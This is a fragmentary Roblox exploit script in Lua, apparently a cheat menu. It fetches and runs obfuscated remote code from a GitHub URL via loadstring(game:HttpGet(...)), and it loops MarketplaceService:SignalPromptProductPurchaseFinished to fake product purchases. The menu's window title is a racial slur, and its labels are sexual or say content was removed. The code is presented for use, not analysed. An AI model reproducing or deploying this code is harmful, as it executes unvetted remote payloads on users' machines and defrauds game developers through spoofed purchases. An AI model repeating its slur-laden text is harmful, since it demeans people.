...
pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/fissurectomy/test/main/Protected_7678700457996470.lua.txt"
...
task.spawn(function()
local discord = (function() local DiscordLib = {}
...
local win = discord:Window("💋❀  NIGGA HACK  ❀💋")
local serv = win:Server("GokuSSJ5FreakyButtSex", "http://www.roblox.com/asset/?id=6031075938")
...
main:Label("something written here was removed")
main:Label("placeholder, something written here was removed")
main:Button("something was here but was removed", function()
pcall(function() setclipboard("something was here but got removed") end)
end)
...
ugc:Seperator()
ugc:Label(" ")
ugc:Label("i will be adding stuff here soon")
ugc:Label("im forced to gatekeep stuff thats supposed to be here\n")
ugc:Label("expected features:")
ugc:Label("- see all ugc items linked to a game")
ugc:Label("- some other stuff that i forgot")
...
pcall(function() stealth_call([[
if getgenv().wyvernlooppurchases then
	while task.wait() do
		for _ = 1, 30 do
			MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, ]] .. product .. [[, true)
		end
	end
else
	MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, ]] .. product .. [[, true)
